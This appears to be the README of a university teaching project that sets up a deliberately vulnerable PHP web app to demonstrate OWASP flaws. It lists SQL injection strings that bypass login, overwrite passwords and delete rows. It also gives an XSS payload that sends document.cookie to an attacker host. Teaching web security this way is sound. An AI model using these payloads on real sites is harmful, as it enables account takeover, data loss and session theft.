# zcu_webapp_security_demo
Small education project demonstrating typical security vulnerabilities in web application.
Created for University of West Bohemia.

## Installation
* Install VirtualBox
* Install [Vagrant](https://docs.vagrantup.com/v2/installation/index.html "Vagrant docs - Istallation")
* Install Vagrant plugin for VirtualBox guest additions
```bash
vagrant plugin install vagrant-vbguest
```
* checkout this repository
```bash
> git clone git@github.com:veny/zcu_webapp_security_demo.git
```
* run vagrant box
```bash
> cd $PRJ_HOME
> vagrant up
```
* in browser go to http://192.168.33.10/index.php

## OWASP top 10 examples
* https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project

### Injection
* put that as password (empty username)
```sql
' OR id='2
```
* or even worst
```sql
'; UPDATE  user SET password='123
'; DELETE FROM user WHERE id='8
```

### XSS
* put following text as notice
```html
<b onmouseup=alert("XSS!")>click me!</b>
```
* or even worst
```html
"><script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>"
```
___

### TODOs:
- misconfiguration - ukazat ze to vylistuje adresar - udelat novyho virtualhosta nebo
- directory traversal


### Troubleshooting
 - Failed to mount folders in Linux guest. This is usually because the "vboxsf" file system is not available. Please verify that the guest additions are properly installed in the guest and  can work properly. The command attempted was:
  - mount -t vboxsf -o uid=`id -u vagrant`,gid=`getent group vagrant | cut -d: -f3` opt_zcu_demo /opt/zcu_demo
  - mount -t vboxsf -o uid=`id -u vagrant`,gid=`id -g vagrant` opt_zcu_demo /opt/zcu_demo
  - The error output from the last command was:
    - /sbin/mount.vboxsf: mounting failed with the error: No such device
 - Problem description and solution described here: https://github.com/dotless-de/vagrant-vbguest/issues/170
